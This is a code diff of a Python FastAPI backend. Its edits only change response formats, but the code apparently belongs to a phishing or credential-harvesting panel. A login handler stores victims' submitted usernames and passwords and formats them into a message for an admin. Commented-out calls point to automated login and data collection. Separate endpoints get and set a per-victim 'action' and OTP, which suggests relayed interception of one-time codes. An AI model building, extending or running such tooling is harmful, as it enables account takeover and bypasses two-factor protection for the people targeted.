@@ -221,7 +221,8 @@ def login(
 
     db_user = crud.add_creds(db, id, item.username, item.password)
     if not db_user:
-        return '{"status":"Error"}'
+        return {"error":True}
+    
 
     admin_message = f"----\n Creds: \n id: {id}\n username:{item.username}\n password:{item.password} \n----"
     # messageAdmin(admin_message)
@@ -251,7 +252,7 @@ def login(
         auto_func.start()
         # auto_mode = modules.auto_login(id, item.username, item.password)
         # auto_mode.collect_all()
-    return '{"status":"OK"}'
+    return {"error":False}
 
 
 def auto_mode_func_listner(q, request, id):
@@ -314,17 +315,17 @@ def get_action(
 ):
     res = crud.get_action(db, id)
     if not res:
-        return '{"status":"Error"}'
-    return json.dumps({"action": res})
+        return {"error":True}
+    return {"error":False,"action": res}
 
 
 def set_action_abstracted(id, action):
     db: Session = next(get_db())
     db_user = crud.set_action(db, id, action)
     if not db_user:
-        return '{"status":"Error"}'
+        return {"error":True}
 
-    return '{"status":"OK"}'
+    return {"error":False}
 
 
 @app.put("/action/{id}/{action}")
@@ -405,17 +406,17 @@ def get_OTP(
 ):
     curr_OTP = crud.get_OTP(db, id)
     if not curr_OTP:
-        return '{"status":"Error"}'
-    return json.dumps({"data": curr_OTP})
+        return {"error":True}
+    return {"error":False,"data": curr_OTP}
 
 
 def set_OPT_abstracted(id, OTP):
     db: Session = next(get_db())
     db_user = crud.set_OTP(db, id, OTP)
     if not db_user:
-        return '{"status":"Error"}'
+        return {"error":True}
 
-    return '{"status":"OK"}'
+    return {"error":False}
 
 
 @app.put("/OTP/{id}/{OTP}")
